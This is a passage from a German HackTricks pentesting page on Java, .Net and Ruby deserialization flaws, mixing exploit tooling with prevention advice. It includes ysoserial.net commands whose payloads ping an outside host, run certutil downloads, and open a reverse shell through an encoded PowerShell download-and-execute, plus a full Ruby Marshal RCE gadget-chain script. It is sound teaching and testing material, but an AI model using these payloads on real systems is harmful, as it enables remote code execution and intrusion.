Sie k√∂nnen [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) zusammen mit ysoserial verwenden, um mehr Exploits zu erstellen. Weitere Informationen zu diesem Tool finden Sie in den **Folien des Vortrags**, in dem das Tool pr√§sentiert wurde: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) kann verwendet werden, um Payloads zu generieren, um verschiedene Json- und Yml-Serialisierungsbibliotheken in Java zu exploitieren.\
Um das Projekt zu kompilieren, musste ich diese **Abh√§ngigkeiten** zur `pom.xml` hinzuf√ºgen:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installiere Maven** und **kompiliere** das Projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Erfahren Sie mehr √ºber diese Java JSON-Bibliothek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Wenn Sie einige ysoserial-Payloads testen m√∂chten, k√∂nnen Sie **diese Webanwendung ausf√ºhren**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Warum

Java verwendet h√§ufig Serialisierung f√ºr verschiedene Zwecke wie:

* **HTTP-Anfragen**: Serialisierung wird weit verbreitet in der Verwaltung von Parametern, ViewState, Cookies usw. eingesetzt.
* **RMI (Remote Method Invocation)**: Das Java RMI-Protokoll, das ausschlie√ülich auf Serialisierung beruht, ist ein Eckpfeiler f√ºr die Remote-Kommunikation in Java-Anwendungen.
* **RMI √ºber HTTP**: Diese Methode wird h√§ufig von Java-basierten Thick-Client-Webanwendungen verwendet, die Serialisierung f√ºr alle Objektkommunikationen nutzen.
* **JMX (Java Management Extensions)**: JMX verwendet Serialisierung zum √úbertragen von Objekten √ºber das Netzwerk.
* **Benutzerdefinierte Protokolle**: In Java erfolgt die √úbertragung von Roh-Java-Objekten nach Standardpraxis, was in kommenden Exploit-Beispielen demonstriert wird.

### Pr√§vention

#### Transiente Objekte

Eine Klasse, die `Serializable` implementiert, kann jedes Objekt innerhalb der Klasse als `transient` implementieren, das nicht serialisierbar sein sollte. Zum Beispiel:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermeiden Sie die Serialisierung einer Klasse, die das Serializable-Interface implementieren muss

In Szenarien, in denen bestimmte **Objekte das `Serializable`-Interface implementieren m√ºssen** aufgrund der Klassenhierarchie, besteht das Risiko einer unbeabsichtigten Deserialisierung. Um dies zu verhindern, stellen Sie sicher, dass diese Objekte nicht deserialisierbar sind, indem Sie eine `final` `readObject()`-Methode definieren, die konsequent eine Ausnahme wirft, wie unten gezeigt:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbesserung der Deserialisierungssicherheit in Java**

Die Anpassung von `java.io.ObjectInputStream` ist ein praktischer Ansatz zur Absicherung von Deserialisierungsprozessen. Diese Methode ist geeignet, wenn:

* Der Deserialisierungscode unter Ihrer Kontrolle steht.
* Die f√ºr die Deserialisierung erwarteten Klassen bekannt sind.

√úberschreiben Sie die Methode **`resolveClass()`**, um die Deserialisierung nur auf erlaubte Klassen zu beschr√§nken. Dadurch wird die Deserialisierung jeder Klasse au√üer denen explizit erlaubten verhindert, wie im folgenden Beispiel, das die Deserialisierung nur auf die Klasse `Bicycle` beschr√§nkt:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Die Verwendung eines Java-Agents zur Sicherheitsverbesserung** bietet eine alternative L√∂sung, wenn eine Code-√Ñnderung nicht m√∂glich ist. Diese Methode gilt haupts√§chlich f√ºr das **Schwarze Listen sch√§dlicher Klassen**, die einen JVM-Parameter verwenden:
```
-javaagent:name-of-agent.jar
```
Es bietet eine M√∂glichkeit, die Deserialisierung dynamisch abzusichern, ideal f√ºr Umgebungen, in denen sofortige Code-√Ñnderungen nicht praktikabel sind.

√úberpr√ºfen Sie ein Beispiel in [rO0 von Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementierung von Serialisierungsfiltern**: Java 9 f√ºhrte Serialisierungsfilter √ºber das **`ObjectInputFilter`**-Interface ein, das einen leistungsstarken Mechanismus zur Festlegung von Kriterien bietet, die serialisierte Objekte erf√ºllen m√ºssen, bevor sie deserialisiert werden. Diese Filter k√∂nnen global oder pro Stream angewendet werden und bieten eine granulare Kontrolle √ºber den Deserialisierungsprozess.

Um Serialisierungsfilter zu nutzen, k√∂nnen Sie einen globalen Filter festlegen, der f√ºr alle Deserialisierungsvorg√§nge gilt, oder ihn dynamisch f√ºr bestimmte Streams konfigurieren. Zum Beispiel:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Nutzung externer Bibliotheken zur Verbesserung der Sicherheit**: Bibliotheken wie **NotSoSerial**, **jdeserialize** und **Kryo** bieten erweiterte Funktionen zur Steuerung und √úberwachung der Java-Deserialisierung. Diese Bibliotheken k√∂nnen zus√§tzliche Sicherheitsebenen bieten, wie das Whitelisting oder Blacklisting von Klassen, die Analyse serialisierter Objekte vor der Deserialisierung und die Implementierung benutzerdefinierter Serialisierungsstrategien.

* **NotSoSerial** unterbricht Deserialisierungsprozesse, um die Ausf√ºhrung nicht vertrauensw√ºrdigen Codes zu verhindern.
* **jdeserialize** erm√∂glicht die Analyse serialisierter Java-Objekte, ohne sie zu deserialisieren, um potenziell b√∂sartige Inhalte zu identifizieren.
* **Kryo** ist ein alternatives Serialisierungsframework, das Geschwindigkeit und Effizienz betont und konfigurierbare Serialisierungsstrategien bietet, die die Sicherheit verbessern k√∂nnen.

### Referenzen

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialisierung und ysoserial Vortrag: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Vortrag √ºber gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) und Folien: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec Paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java und .Net JSON Deserialisierungs **Paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialisierungs CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Erfahren Sie, was **JNDI Injection ist, wie man sie √ºber RMI, CORBA & LDAP missbrauchen kann und wie man log4shell ausnutzt** (und ein Beispiel f√ºr diese Schwachstelle) auf der folgenden Seite:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> Die **Java Message Service** (**JMS**) API ist eine Java message-orientierte Middleware-API zum Senden von Nachrichten zwischen zwei oder mehr Clients. Es handelt sich um eine Implementierung zur Behandlung des Produzenten-Verbraucher-Problems. JMS ist ein Teil der Java Platform, Enterprise Edition (Java EE) und wurde von einer bei Sun Microsystems entwickelten Spezifikation definiert, die jedoch seitdem vom Java Community Process geleitet wird. Es handelt sich um einen Messaging-Standard, der es Anwendungskomponenten auf Basis von Java EE erm√∂glicht, Nachrichten zu erstellen, zu senden, zu empfangen und zu lesen. Er erm√∂glicht die Kommunikation zwischen verschiedenen Komponenten einer verteilten Anwendung, die lose gekoppelt, zuverl√§ssig und asynchron ist. (Aus [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkte

Es gibt mehrere Produkte, die diese Middleware zum Senden von Nachrichten verwenden:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Ausnutzung

Grunds√§tzlich gibt es eine **Reihe von Diensten, die JMS auf gef√§hrliche Weise verwenden**. Daher, wenn Sie **ausreichende Berechtigungen** haben, um Nachrichten an diese Dienste zu senden (normalerweise ben√∂tigen Sie g√ºltige Anmeldeinformationen), k√∂nnten Sie in der Lage sein, **b√∂sartige Objekte serialisiert zu senden, die vom Verbraucher/Abonnenten deserialisiert werden**.\
Das bedeutet, dass in dieser Ausnutzung alle **Clients, die diese Nachricht verwenden, infiziert werden**.

Sie sollten daran denken, dass selbst wenn ein Dienst anf√§llig ist (weil er Benutzereingaben unsicher deserialisiert), Sie immer noch g√ºltige Gadgets finden m√ºssen, um die Schwachstelle auszunutzen.

Das Tool [JMET](https://github.com/matthiaskaiser/jmet) wurde erstellt, um **diese Dienste zu verbinden und anzugreifen, indem mehrere b√∂sartige Objekte serialisiert werden, die bekannte Gadgets verwenden**. Diese Exploits funktionieren, wenn der Dienst immer noch anf√§llig ist und wenn eines der verwendeten Gadgets in der anf√§lligen Anwendung vorhanden ist.

### Referenzen

* JMET Vortrag: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Folien: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Im Kontext von .Net funktionieren Deserialisierungs-Exploits √§hnlich wie in Java, wobei Gadgets ausgenutzt werden, um w√§hrend der Deserialisierung eines Objekts spezifischen Code auszuf√ºhren.
### Fingerabdruck

#### WhiteBox

Der Quellcode sollte auf Vorkommen von √ºberpr√ºft werden:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Der Fokus sollte auf Serialisierern liegen, die es erm√∂glichen, den Typ anhand einer vom Benutzer kontrollierten Variablen zu bestimmen.

#### BlackBox

Die Suche sollte auf den Base64-codierten String **AAEAAAD/////** oder ein √§hnliches Muster abzielen, das auf der Serverseite deserialisiert werden k√∂nnte und die Kontrolle √ºber den zu deserialisierenden Typ gew√§hrt. Dies k√∂nnte **JSON**- oder **XML**-Strukturen umfassen, die `TypeObject` oder `$type` enthalten.

### ysoserial.net

In diesem Fall k√∂nnen Sie das Tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) verwenden, um **die Deserialisierungs-Exploits zu erstellen**. Nachdem Sie das Git-Repository heruntergeladen haben, sollten Sie das Tool z. B. mit Visual Studio **kompilieren**.

Wenn Sie mehr dar√ºber erfahren m√∂chten, **wie ysoserial.net seinen Exploit erstellt**, k√∂nnen Sie [**diese Seite √ºberpr√ºfen, auf der der ObjectDataProvider-Gadget + ExpandedWrapper + Json.Net-Formatter erkl√§rt wird**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die Hauptoptionen von **ysoserial.net** sind: **`--gadget`**, **`--formatter`**, **`--output`** und **`--plugin`.**

* **`--gadget`** wird verwendet, um den Gadget anzugeben, der missbraucht werden soll (geben Sie die Klasse/Funktion an, die w√§hrend der Deserialisierung missbraucht wird, um Befehle auszuf√ºhren).
* **`--formatter`**, wird verwendet, um die Methode anzugeben, mit der der Exploit serialisiert wird (Sie m√ºssen wissen, welche Bibliothek das Backend zum Deserialisieren des Payloads verwendet und dieselbe zum Serialisieren verwenden)
* **`--output`** wird verwendet, um anzugeben, ob Sie den Exploit im **rohen** oder **Base64**-Format m√∂chten. _Beachten Sie, dass **ysoserial.net** das Payload mit **UTF-16LE** (Standardcodierung unter Windows) codiert, sodass Sie bei der Verwendung des rohen Payloads und der Codierung aus einer Linux-Konsole m√∂glicherweise auf **Codierungskompatibilit√§tsprobleme** sto√üen, die verhindern, dass der Exploit ordnungsgem√§√ü funktioniert (im HTB JSON-Box funktionierte der Payload sowohl in UTF-16LE als auch in ASCII, aber das bedeutet nicht, dass er immer funktioniert)._
* **`--plugin`** ysoserial.net unterst√ºtzt Plugins zum Erstellen von **Exploits f√ºr bestimmte Frameworks** wie ViewState

#### Weitere ysoserial.net-Parameter

* `--minify` liefert ein **kleineres Payload** (falls m√∂glich)
* `--raf -f Json.Net -c "anything"` Dies gibt alle Gadgets an, die mit einem bereitgestellten Formatter (`Json.Net` in diesem Fall) verwendet werden k√∂nnen
* `--sf xml` Sie k√∂nnen ein Gadget angeben (`-g`) und ysoserial.net wird nach Formattern suchen, die "xml" enthalten (Gro√ü-/Kleinschreibung wird nicht beachtet)

**Beispiele f√ºr ysoserial.net**, um Exploits zu erstellen:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** hat auch einen **sehr interessanten Parameter**, der dabei hilft, besser zu verstehen, wie jeder Exploit funktioniert: `--test`\
Wenn Sie diesen Parameter angeben, wird **ysoserial.net** den **Exploit lokal ausf√ºhren**, damit Sie testen k√∂nnen, ob Ihr Payload korrekt funktioniert.\
Dieser Parameter ist hilfreich, weil Sie beim √úberpr√ºfen des Codes Codebl√∂cke wie den folgenden finden werden (aus [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Das bedeutet, dass der Code zur √úberpr√ºfung des Exploits [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aufrufen wird.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Der **vorherige Code ist anf√§llig f√ºr den erstellten Exploit**. Wenn Sie also etwas √Ñhnliches in einer .Net-Anwendung finden, bedeutet dies wahrscheinlich, dass diese Anwendung auch anf√§llig ist.\
Daher erm√∂glicht uns der **`--test`**-Parameter zu verstehen, **welche Codeabschnitte anf√§llig** f√ºr den Deserialisierungs-Exploit sind, den **ysoserial.net** erstellen kann.

### ViewState

Werfen Sie einen Blick auf [diesen POST √ºber **wie man versucht, den \_\_ViewState-Parameter von .Net zu exploitieren**](exploiting-\_\_viewstate-parameter.md), um **beliebigen Code auszuf√ºhren**. Wenn Sie **die Geheimnisse bereits kennen**, die von der Opfermaschine verwendet werden, [**lesen Sie diesen Beitrag, um Code auszuf√ºhren**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Pr√§vention

Um die mit der Deserialisierung in .Net verbundenen Risiken zu mindern:

* **Vermeiden Sie es, Datenstr√∂me ihre Objekttypen definieren zu lassen.** Verwenden Sie `DataContractSerializer` oder `XmlSerializer`, wenn m√∂glich.
* **F√ºr `JSON.Net` setzen Sie `TypeNameHandling` auf `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Verwenden Sie `JavaScriptSerializer` nicht mit einem `JavaScriptTypeResolver`.**
* **Beschr√§nken Sie die Typen, die deserialisiert werden k√∂nnen**, und verstehen Sie die inh√§renten Risiken bei .Net-Typen wie `System.IO.FileInfo`, die die Eigenschaften von Serverdateien √§ndern k√∂nnen und m√∂glicherweise zu Denial-of-Service-Angriffen f√ºhren.
* **Seien Sie vorsichtig bei Typen mit riskanten Eigenschaften**, wie `System.ComponentModel.DataAnnotations.ValidationException` mit ihrer `Value`-Eigenschaft, die ausgenutzt werden kann.
* **Kontrollieren Sie die sichere Typinstanziierung**, um zu verhindern, dass Angreifer den Deserialisierungsprozess beeinflussen, was selbst `DataContractSerializer` oder `XmlSerializer` angreifbar machen k√∂nnte.
* **Implementieren Sie Whitelist-Steuerungen**, indem Sie einen benutzerdefinierten `SerializationBinder` f√ºr `BinaryFormatter` und `JSON.Net` verwenden.
* **Bleiben Sie √ºber bekannte unsichere Deserialisierungsgadgets** in .Net informiert und stellen Sie sicher, dass Deserialisierer solche Typen nicht instanziieren.
* **Isolieren Sie potenziell riskanten Code** von Code mit Internetzugriff, um bekannte Gadgets wie `System.Windows.Data.ObjectDataProvider` in WPF-Anwendungen nicht unvertrauten Datenquellen auszusetzen.

### **Referenzen**

* Java und .Net JSON-Deserialisierungs-**Dokumentation:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby wird die Serialisierung durch zwei Methoden in der **marshal**-Bibliothek erleichtert. Die erste Methode, bekannt als **dump**, wird verwendet, um ein Objekt in einen Byte-Stream zu transformieren. Dieser Prozess wird als Serialisierung bezeichnet. Die zweite Methode, **load**, wird hingegen verwendet, um einen Byte-Stream wieder in ein Objekt zur√ºckzuverwandeln, ein Prozess, der als Deserialisierung bekannt ist.

Zur Sicherung serialisierter Objekte verwendet **Ruby HMAC (Hash-Based Message Authentication Code)**, um die Integrit√§t und Authentizit√§t der Daten zu gew√§hrleisten. Der f√ºr diesen Zweck verwendete Schl√ºssel wird an einem von mehreren m√∂glichen Orten gespeichert:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generische Deserialisierung zu RCE-Gadget-Kette (weitere Informationen unter** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Andere RCE-Kette zur Ausnutzung von Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() Methode

Wie in [**diesem Schwachstellenbericht**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) erkl√§rt, wenn einige Benutzereingaben die `.send()` Methode eines Ruby-Objekts erreichen, erm√∂glicht diese Methode das **Aufrufen einer beliebigen anderen Methode** des Objekts mit beliebigen Parametern.

Beispielsweise wird das Aufrufen von eval und dann Ruby-Code als zweiter Parameter die Ausf√ºhrung beliebigen Codes erm√∂glichen:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Dar√ºber hinaus, wenn nur ein Parameter von **`.send()`** von einem Angreifer kontrolliert wird, wie im vorherigen Text erw√§hnt, ist es m√∂glich, jede Methode des Objekts aufzurufen, die **keine Argumente ben√∂tigt** oder deren Argumente **Standardwerte haben**.\
Daf√ºr ist es m√∂glich, alle Methoden des Objekts aufzulisten, um **einige interessante Methoden zu finden, die diese Anforderungen erf√ºllen**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
